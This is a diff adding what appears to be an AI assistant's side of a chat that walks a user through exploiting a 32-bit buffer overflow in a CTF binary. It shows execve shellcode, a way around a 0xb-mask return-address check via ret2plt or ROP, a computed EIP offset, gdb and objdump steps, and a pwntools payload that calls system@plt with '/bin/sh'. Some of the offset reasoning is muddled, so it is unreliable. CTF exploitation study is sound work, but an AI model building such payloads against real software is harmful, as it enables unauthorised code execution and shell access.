@@ -44,3 +44,100 @@ int 0x80              ; syscall: execve("/bin//sh", argv, NULL)
     \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
 
 ```
+
+Yes — that’s shellcode/function injection, a standard step after you control EIP in a buffer overflow. Quick rundown of the main approaches:
+
+1. Classic shellcode injection (stack/heap)
+Once you control EIP, you point it at attacker-controlled memory containing machine code (your “function”), not a C function per se:
+
+The 0xb0000000 mask check is why this binary is designed to break classic stack-smashing or ret2libc: on 32-bit Linux without ASLR, the stack sits around 0xbfxxxxxx and libc loads around 0xb7xxxxxx — both start with 1011 in the top nibble, so (addr & 0xb0000000) == 0xb0000000 catches both ranges. If your overwritten return address lands in either, the program detects it and calls _exit(1) before you get control.
+
+This forces your injected address to point somewhere else — meaning:
+
+What still works:
+
+ret2plt / ret2text — addresses inside the main binary (non-PIE, typically 0x08048000 range) don’t match the 0xb mask. If system() is already linked via PLT, you can ret straight into system@plt with a fake stack frame (system@plt addr, fake return addr, pointer to "/bin/sh" — often findable inside your own overflow buffer).
+ROP using only binary gadgets — if there’s no convenient system/"/bin/sh" combo, chain gadgets (pop; ret, etc.) found via ROPgadget --binary <file> inside the executable itself, since those addresses are also in the 0x08048000 range.
+Stack pivot to .bss — write shellcode into .bss (also not in the 0xb range) via a read()/gets() call you ROP into, then ret into .bss.
+
+What’s blocked: plain shellcode-on-stack, and anything landing in libc directly via leaked libc addresses.
+
+To pick the right approach I need a few things from you:
+
+checksec output (NX, PIE, canary, RELRO) — PIE changes everything since then no static address is safe to hardcode
+objdump -d <binary> | grep plt — is system already imported, or only puts/strdup/gets?
+Any "/bin/sh" string in the binary, or do you need to inject one via your buffer and reference its stack address?
+Architecture confirmed 32-bit (uint/76-byte buffer suggests yes)?
+
+Paste those and I’ll help build the exact payload (offset to EIP, fake frame, gadget addresses).
+
+--------------------------------------------------------------------------------------------------------------
+
+Confirmed 32-bit. Good — since the 0xb mask check only fires on the jump target (the return address pulled for EIP), not on data pointers, you can still place "/bin/sh" in your buffer and pass its stack address as an argument to system(). Only the actual control-flow target (system@plt) needs to avoid the 0xb range — and system@plt lives in the binary’s own .plt, typically 0x0804xxxx, so it passes the check fine.
+
+Payload layout (classic ret2plt with injected string):
+
+[padding to EIP] + [addr of system@plt] + [fake return addr] + [addr of "/bin/sh" in buffer]
+
+Steps:
+
+Get the offset to EIP. You used a custom pattern, not pwntools’ cyclic. What value did EIP/EBP actually contain when it crashed? I need that to compute the exact offset — each 4-byte block in your pattern (aaaa, baaa, caaa...) is unique, so whichever 4 bytes ended up in EIP tells us the offset directly (position of that block × 4).
+Find system@plt:
+objdump -d ./binary | grep '<system@plt>:'
+Put /bin/sh in the buffer and get its runtime address:
+Append the string "/bin/sh\x00" somewhere in your overflow buffer (e.g. right after the padding, before the EIP overwrite — just make sure it doesn’t collide with bytes you need for the offset/addresses).
+Find its stack address with gdb: break at gets, run, then once in p():
+     x/s local_50
+ (or `print &local_50`) — this gives you the base address; since you control the buffer content, `/bin/sh` address = base + known offset into your payload.
+Caveat: stack addresses are 0xbf... — that’s fine here since this is a data pointer argument, not the EIP target, so the mask check never inspects it.
+Fake return address after system(): doesn’t matter for a one-shot CTF exploit — use b"JUNK" or point it at _exit@plt if you want clean exit.
+
+Paste:
+
+the crash EIP value (or EBP) from your pattern
+objdump -d ./binary | grep -E 'system|puts|strdup|plt'
+
+and I’ll compute the exact offset + build the full pwntools script.
+
+pyload: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaraaa
+$ebp   : 0x61616174 ("taaa"?)
+
+$eip   : 0x61616172 ("raaa"?)
+---------------------------------------------------------------------------------------------------
+
+Offset found. EIP = 0x61616172 decodes (little-endian) to bytes 72 61 61 61 = "raaa", and EBP = "taaa". Matching those against your pattern:
+
+taaa is the 20th block → offset 76
+the next raaa (after taaa) is the 21st block → offset 80
+
+So: EIP offset = 80 bytes, consistent with local_50[76] + 4-byte saved EBP = 80, then EIP at bytes 80–83. Clean.
+
+Payload skeleton now:
+
+```python
+from pwn import *
+
+offset = 80
+binsh_offset = 0   # where in your buffer you put "/bin/sh\x00" — put it at the very start
+
+payload  = b"/bin/sh\x00"
+payload += b"A" * (offset - len(payload))   # pad to 80
+payload += p32(system_plt)                  # EIP -> system@plt
+payload += b"JUNK"                          # fake return addr after system()
+payload += p32(binsh_addr)                  # arg to system() -> "/bin/sh"
+
+```
+
+Still need two things to finish it:
+
+objdump -d ./binary | grep -E 'system|plt' — to confirm system@plt is actually linked (your source only calls fflush, gets, printf, puts, strdup, _exit — if system isn’t imported anywhere, it won’t have a PLT stub, and we’d need a different strategy: ret2strdup/format-string leak, or build a ROP chain to execve via strdup’s return + a gadget, or check for a win/system-calling function already in the binary).
+The stack address of your buffer — run in gdb:
+gdb ./binary
+b *p+<offset of gets call>   # or just b gets
+run
+# after gets returns, before the if-check:
+x/s $esp-80    # or print &local_50 if symbols available
+
+This gives you binsh_addr to plug in.
+
+Paste the objdump grep output — that decides whether system@plt is even viable here.
